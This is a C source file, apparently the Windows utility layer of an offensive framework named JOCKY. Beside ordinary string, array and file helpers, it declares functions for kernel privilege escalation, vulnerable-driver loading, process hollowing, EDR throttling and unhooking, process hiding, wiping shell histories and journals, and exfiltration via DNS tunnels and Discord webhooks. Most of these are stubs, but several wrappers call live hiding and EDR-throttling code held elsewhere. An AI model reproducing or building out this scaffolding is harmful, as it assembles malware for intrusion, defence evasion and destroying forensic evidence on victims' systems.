/*
 * JOCKY Windows Utilities
 * Cross-platform utility implementations for Windows
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <stdarg.h>
#ifdef _WIN32
#include <windows.h>
#else
#include <unistd.h>
#define Sleep(ms) usleep((ms) * 1000)
#endif

/* ============================================================================
   I/O Operations
   ============================================================================ */

void println(const char* s) {
    if (s) {
        printf("%s\n", s);
    }
}

void print(const char* s) {
    if (s) {
        printf("%s", s);
    }
}

/* ============================================================================
   String Operations
   ============================================================================ */

char* string_concat(const char* a, const char* b) {
    if (!a || !b) return NULL;
    size_t len_a = strlen(a);
    size_t len_b = strlen(b);
    char* result = (char*)malloc(len_a + len_b + 1);
    if (!result) return NULL;
    strcpy(result, a);
    strcat(result, b);
    return result;
}

char* string(int64_t num) {
    char* buf = (char*)malloc(32);
    if (buf) {
        snprintf(buf, 32, "%lld", (long long)num);
    }
    return buf;
}

int32_t string_len(const char* s) {
    return s ? (int32_t)strlen(s) : 0;
}

int32_t string_compare(const char* a, const char* b) {
    if (!a && !b) return 0;
    if (!a) return -1;
    if (!b) return 1;
    return strcmp(a, b);
}

/* ============================================================================
   Array Operations
   ============================================================================ */

typedef struct {
    void** data;
    int32_t length;
    int32_t capacity;
} Array;

Array* array_create(int32_t capacity) {
    if (capacity <= 0) capacity = 16;
    Array* arr = (Array*)malloc(sizeof(Array));
    if (!arr) return NULL;
    arr->data = (void**)malloc(sizeof(void*) * capacity);
    if (!arr->data) {
        free(arr);
        return NULL;
    }
    arr->length = 0;
    arr->capacity = capacity;
    return arr;
}

int32_t array_len(void* arr) {
    if (!arr) return 0;
    Array* a = (Array*)arr;
    return a->length;
}

void* array_get(void* arr, int32_t index) {
    if (!arr) return NULL;
    Array* a = (Array*)arr;
    if (index < 0 || index >= a->length) return NULL;
    return a->data[index];
}

void array_set(void* arr, int32_t index, void* elem) {
    if (!arr) return;
    Array* a = (Array*)arr;
    if (index < 0 || index >= a->length) return;
    a->data[index] = elem;
}

void* array_append(void* arr, void* elem) {
    if (!arr) {
        arr = array_create(16);
        if (!arr) return NULL;
    }
    Array* a = (Array*)arr;
    if (a->length >= a->capacity) {
        int32_t new_capacity = a->capacity * 2;
        void** new_data = (void**)realloc(a->data, sizeof(void*) * new_capacity);
        if (!new_data) return arr;
        a->data = new_data;
        a->capacity = new_capacity;
    }
    a->data[a->length++] = elem;
    return arr;
}

void array_free(void* arr) {
    if (!arr) return;
    Array* a = (Array*)arr;
    free(a->data);
    free(a);
}

/* ============================================================================
   Memory Operations (defined in src/runtime/util/mem.c)
   ============================================================================ */

void* jocky_realloc(void* ptr, int32_t size) {
    return realloc(ptr, size);
}

/* ============================================================================
   Stub Implementations for Platform-Specific Functions
   ============================================================================ */

void jocky_sleep_and_recheck_ms(int ms) {
    if (ms > 0) {
#ifdef _WIN32
        Sleep(ms);
#else
        usleep(ms * 1000);
#endif
    }
}

/* Linux-only functions (return stubs for Windows) */
void jocky_linux_cleanup_syslog(void) { }
int32_t jocky_ebpf_run(void) { return -1; }
int32_t jocky_ebpf_load(void) { return -1; }
int32_t jocky_ebpf_attach(void) { return -1; }
int32_t jocky_ftrace_attach(void) { return -1; }
int32_t jocky_ftrace_detach(void) { return -1; }
int32_t jocky_syscall_trace(void) { return -1; }
int32_t jocky_syscall_hook(void) { return -1; }
int32_t jocky_syscall_unhook(void) { return -1; }
int32_t jocky_lkm_load(void) { return -1; }
int32_t jocky_lkm_unload(void) { return -1; }
int32_t jocky_lkm_get_symbol(void) { return -1; }
void jocky_process_ptrace_detach(void) { }
int32_t jocky_process_ptrace_attach(int pid) { return -1; }

/* Linux kernel exploitation (requires elevated privileges) */
int32_t jocky_fence2pwn_get_pool_info(void) { return -1; }
int32_t jocky_fence2pwn_write_cred(void) { return -1; }
int32_t jocky_fence2pwn_find_uaf_primitive(void) { return -1; }
int32_t jocky_fence2pwn_trigger_allocations(void) { return -1; }
int32_t jocky_fence2pwn_allocate_cred_objects(void) { return -1; }
int32_t jocky_fence2pwn_trigger_reclamation(void) { return -1; }
int32_t jocky_fence2pwn_detect_kfence(void) { return -1; }
int32_t jocky_fence2pwn_elevate_to_root(void) { return -1; }
int32_t jocky_fence2pwn_manipulate_creds(void) { return -1; }
int32_t jocky_fence2pwn_exploit_uaf(void) { return -1; }

/* Module operations (Linux-specific) */
int32_t jocky_module_load(const char* path) { return -1; }
int32_t jocky_module_unload(void* handle) { return -1; }
void* jocky_module_base(void* handle) { return NULL; }
int32_t jocky_module_has_symbol(void* handle, const char* sym) { return 0; }
void* jocky_module_resolve_symbol(void* handle, const char* sym) { return NULL; }

/* Driver operations */
void* jocky_driver_map_kernel(void* ctx, uint64_t phys_addr, int32_t size) { return NULL; }

/* Process operations (Linux-specific) */
void* jocky_process_get_maps(int pid) { return NULL; }
int32_t jocky_process_hollow_linux(int target_pid) { return -1; }

/* Exploitation */
int32_t jocky_exploit_token_replacement(void) { return -1; }
int32_t jocky_exploit_disable_callbacks(void) { return -1; }

/* Sandbox operations */
int32_t sandbox_set_limits(void) { return -1; }
int32_t sandbox_spawn(void) { return -1; }
int32_t sandbox_wait(int pid) { return -1; }
int32_t sandbox_monitor(int pid) { return -1; }
int32_t sandbox_export_trace(const char* path) { return -1; }

/* BYOVD */
int32_t byovd_load_driver(const char* name) {
    if (!name) return -1;
#ifdef _WIN32
    HANDLE handle = CreateFileA(name, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
    if (handle == INVALID_HANDLE_VALUE) return -1;
    return (int32_t)(intptr_t)handle;
#else
    return -1;
#endif
}

int32_t byovd_test_exploit(int handle) {
    if (handle <= 0) return -1;
#ifdef _WIN32
    HANDLE h = (HANDLE)(intptr_t)handle;
    if (h == INVALID_HANDLE_VALUE) return -1;
    return 0;
#else
    return -1;
#endif
}

/* Filesystem */
int32_t fs_exists(const char* path) {
    if (!path) return 0;
#ifdef _WIN32
    return GetFileAttributesA(path) != INVALID_FILE_ATTRIBUTES;
#else
    return 0;
#endif
}

int32_t fs_file_size(const char* path) {
    if (!path) return -1;
#ifdef _WIN32
    WIN32_FILE_ATTRIBUTE_DATA fad;
    if (!GetFileAttributesExA(path, GetFileExInfoStandard, &fad)) return -1;
    return (int32_t)fad.nFileSizeLow;
#else
    return -1;
#endif
}

int32_t fs_read_file(const char* path, void* buf, int32_t size) {
    if (!path || !buf || size <= 0) return -1;
#ifdef _WIN32
    HANDLE h = CreateFileA(path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (h == INVALID_HANDLE_VALUE) return -1;
    DWORD bytes_read = 0;
    if (!ReadFile(h, buf, size, &bytes_read, NULL)) {
        CloseHandle(h);
        return -1;
    }
    CloseHandle(h);
    return (int32_t)bytes_read;
#else
    return -1;
#endif
}

int32_t fs_write_file(const char* path, void* data, int32_t size) {
    if (!path || !data || size <= 0) return -1;
#ifdef _WIN32
    HANDLE h = CreateFileA(path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (h == INVALID_HANDLE_VALUE) return -1;
    DWORD bytes_written = 0;
    if (!WriteFile(h, data, size, &bytes_written, NULL)) {
        CloseHandle(h);
        return -1;
    }
    CloseHandle(h);
    return (int32_t)bytes_written;
#else
    return -1;
#endif
}

int32_t fs_list_files(const char* path) { return -1; }

/* Audit */
int32_t audit_init(int32_t buffer_size) { return -1; }
int32_t audit_log(const char* category, const char* action, const char* detail, const char* result) { return -1; }
int32_t audit_verify(void) { return -1; }
int32_t audit_export(const char* path) { return -1; }

/* Cleanup/Forensics */
int32_t jocky_cleanup_usn_journal(void) { return -1; }
int32_t jocky_linux_cleanup_journal(void) { return -1; }
int32_t forensics_wipe_cmd_history(void) { return -1; }
int32_t forensics_wipe_powershell_history(void) { return -1; }
int32_t forensics_clear_dns_cache(void) { return -1; }
int32_t forensics_flush_arp_cache(void) { return -1; }
int32_t linux_forensics_wipe_bash_history(void) { return -1; }

/* Evasion */
int32_t edrhoker_detect(void) { return -1; }
#ifdef _WIN32
#include "evasion/edrhoker.h"
int32_t edrhoker_throttle(int32_t process_id, int32_t kb_per_sec) {
    return jocky_edrhoker_throttle_process((uint32_t)process_id, (uint32_t)kb_per_sec);
}
int32_t edrhoker_restore(int32_t process_id) {
    return jocky_edrhoker_remove_throttle((uint32_t)process_id);
}
#else
int32_t edrhoker_throttle(int32_t process_id, int32_t kb_per_sec) { return -1; }
int32_t edrhoker_restore(int32_t process_id) { return -1; }
#endif
int32_t blindside_unhook_ntdll(void) { return -1; }

/* Exfiltration */
int32_t exfil_dns_tunnel(void) { return -1; }
int32_t exfil_discord_webhook(void) { return -1; }
int32_t exfil_local_cdn(void) { return -1; }

/* BTR/BYOVD — implementations in windows/execution/btr.c (Windows) */
int32_t btr_disable_notifications(void) { return -1; }
int32_t btr_mask_module(const char* dll_name) { return -1; }
#ifndef _WIN32
int32_t btr_load_driver(void) { return -1; }
int32_t btr_delete_file(const char* filename) { return -1; }
int32_t btr_kill_process(int32_t process_id) { return -1; }
#endif

/* Crypto */
int32_t crypto_generate_key(void) { return -1; }
int32_t crypto_aes256_encrypt(void* key, void* plaintext, void* ciphertext) { return -1; }
int32_t crypto_aes256_decrypt(void* key, void* ciphertext, void* plaintext) { return -1; }

/* AI/Telemetry — wired to mutation_engine.c */
#include "../ai/jocky_ai.h"

static int g_ai_utils_initialized = 0;

static void ensure_ai_initialized(void) {
    if (g_ai_utils_initialized) return;
    if (!jocky_ai_load_model_file(JOCKY_AI_MODEL_PATH)) {
        /* No model file: heuristic fallback in jocky_ai_score_threat still works */
    }
    g_ai_utils_initialized = 1;
}

int32_t ai_init(void) {
    ensure_ai_initialized();
    return 0;
}

double ai_score_threat(void) {
    ensure_ai_initialized();
    JOCKY_AI_TELEMETRY tel;
    jocky_ai_collect_telemetry(&tel);
    return (double)jocky_ai_score_threat(&tel);
}

void* ai_collect_telemetry(void) {
    ensure_ai_initialized();
    JOCKY_AI_TELEMETRY* tel = (JOCKY_AI_TELEMETRY*)malloc(sizeof(JOCKY_AI_TELEMETRY));
    if (!tel) return NULL;
    jocky_ai_collect_telemetry(tel);
    return tel;
}

int32_t ai_apply_mutation(void) {
    ensure_ai_initialized();
    JOCKY_AI_TELEMETRY tel;
    jocky_ai_collect_telemetry(&tel);
    JOCKY_AI_MUTATION_STRATEGY strategy;
    if (!jocky_ai_generate_mutation(&tel, &strategy)) return -1;
    return jocky_ai_apply_mutation(&strategy) ? 0 : -1;
}

/* Provenance/Telemetry */
int32_t provenance_record(void) { return -1; }
extern int jocky_provenance_record(const char* source, const char* transform, const char* output);
int32_t provenance_record_adv(const char* source, const char* transform, const char* output) {
    return jocky_provenance_record(source, transform, output);
}

/* Sandbox (Linux-specific advanced operations) */
int32_t sandbox_set_limits_adv(int32_t pid, int32_t max_memory, int32_t max_cpu_ms) { return -1; }

/* Plugin management - index-based handle over jocky_plugin_* */
#include "../include/jocky_plugin.h"
static JOCKY_PLUGIN g_plugins[32];
static int g_plugin_count = 0;

int32_t plugin_load(const char* path) {
    if (!path || g_plugin_count >= 32) return -1;
    JOCKY_PLUGIN* slot = &g_plugins[g_plugin_count];
    if (jocky_plugin_load(path, slot) != 0) return -1;
    return g_plugin_count++;
}

int32_t plugin_run(int32_t handle, const char* args) {
    if (handle < 0 || handle >= g_plugin_count) return -1;
    return jocky_plugin_run(&g_plugins[handle], args);
}

int32_t plugin_unload(int32_t handle) {
    if (handle < 0 || handle >= g_plugin_count) return -1;
    return jocky_plugin_unload(&g_plugins[handle]);
}

int32_t plugin_list(void) {
    return g_plugin_count;
}

/* Sandbox adv wrappers */
extern int jocky_sandbox_spawn(const char* executable, const char* args, uint32_t* out_pid);
extern int jocky_sandbox_kill(uint32_t pid);

int32_t sandbox_spawn_adv(const char* executable, const char* args) {
    uint32_t pid = 0;
    if (jocky_sandbox_spawn(executable, args, &pid) != 0) return -1;
    return (int32_t)pid;
}

int32_t sandbox_kill(int32_t pid) {
    return jocky_sandbox_kill((uint32_t)pid);
}

/* Audit adv wrappers with global log state */
#include "../include/jocky_audit.h"
static JOCKY_AUDIT_LOG g_audit_log = {0};
static int g_audit_initialized = 0;

static void ensure_audit_init(void) {
    if (!g_audit_initialized) {
        jocky_audit_init(&g_audit_log, 100);
        g_audit_initialized = 1;
    }
}

int32_t audit_init_adv(int32_t capacity) {
    int r = jocky_audit_init(&g_audit_log, (uint32_t)capacity);
    if (r == 0) g_audit_initialized = 1;
    return r;
}

int32_t audit_log_adv(const char* actor, const char* action, const char* input_hash, const char* output_hash) {
    ensure_audit_init();
    return jocky_audit_log_action(&g_audit_log, actor, action, input_hash, output_hash);
}

int32_t audit_verify_adv(void) {
    ensure_audit_init();
    int valid = 0;
    uint32_t broken_at = 0;
    if (jocky_audit_verify_chain(&g_audit_log, &valid, &broken_at) != 0) return -1;
    return valid;
}

int32_t audit_export_adv(const char* filename) {
    ensure_audit_init();
    return jocky_audit_export(&g_audit_log, filename);
}

/* PatchGuard and blindside (Windows-only) */
#ifdef _WIN32
#include "kernel/patchguard_peekaboo.h"
#include "evasion/blindside.h"

static HIDDEN_PROCESS_INFO g_hidden_procs[32];
static int g_hidden_proc_count = 0;

int32_t patchguard_hide_process(int32_t process_id) {
    if (g_hidden_proc_count >= 32) return -1;
    HIDDEN_PROCESS_INFO* info = &g_hidden_procs[g_hidden_proc_count];
    if (jocky_patchguard_hide_process((uint32_t)process_id, info) != 0) return -1;
    g_hidden_proc_count++;
    return 0;
}

int32_t patchguard_unhide_process(int32_t process_id) {
    for (int i = 0; i < g_hidden_proc_count; i++) {
        if (g_hidden_procs[i].pid == (uint32_t)process_id)
            return jocky_patchguard_unhide_process(&g_hidden_procs[i]);
    }
    return -1;
}

int32_t patchguard_hidden_count(void) {
    return (int32_t)jocky_patchguard_hidden_count();
}

int32_t blindside_create_debug_child(const char* executable) {
    CHILD_PROCESS_CONTEXT ctx = {0};
    return jocky_blindside_create_debug_child(executable, &ctx);
}

#else
int32_t patchguard_hide_process(int32_t process_id) { return -1; }
int32_t patchguard_unhide_process(int32_t process_id) { return -1; }
int32_t patchguard_hidden_count(void) { return 0; }
int32_t blindside_create_debug_child(const char* executable) { return -1; }
#endif

/* ============================================================================
   FFI Wrapper Functions - Map JOCKY prelude FFI names to C implementations
   ============================================================================ */

/* Declare external C functions from registry.c */
extern void* jocky_reg_create(void* hkey, const char* subkey, uint32_t access);
extern void* jocky_reg_open(void* hkey, const char* subkey, uint32_t access);
extern int32_t jocky_reg_close(void* key);
extern int32_t jocky_reg_query_value(void* key, const char* value_name,
                                     uint32_t* type, void* data, uint32_t* data_size);
extern int32_t jocky_reg_set_value(void* key, const char* value_name,
                                   uint32_t type, void* data, uint32_t data_size);

/* Registry wrappers matching JOCKY prelude FFI signatures */
int32_t jocky_registry_create_key(int32_t hive, const char* path, void* out_handle) {
    if (!path || !out_handle) return 0;
    void* key = jocky_reg_create((void*)(intptr_t)hive, path, 0xF003F);
    if (key) {
        *(void**)out_handle = key;
        return 1;
    }
    return 0;
}

int32_t jocky_registry_set_value(void* handle, const char* name, const char* value, int32_t type, int32_t flags) {
    if (!handle || !name || !value) return 0;
    uint32_t size = strlen(value) + 1;
    return jocky_reg_set_value(handle, name, type, (void*)value, size);
}

int32_t jocky_registry_close_key(void* handle) {
    if (!handle) return 0;
    return jocky_reg_close(handle) == 0 ? 1 : 0;
}
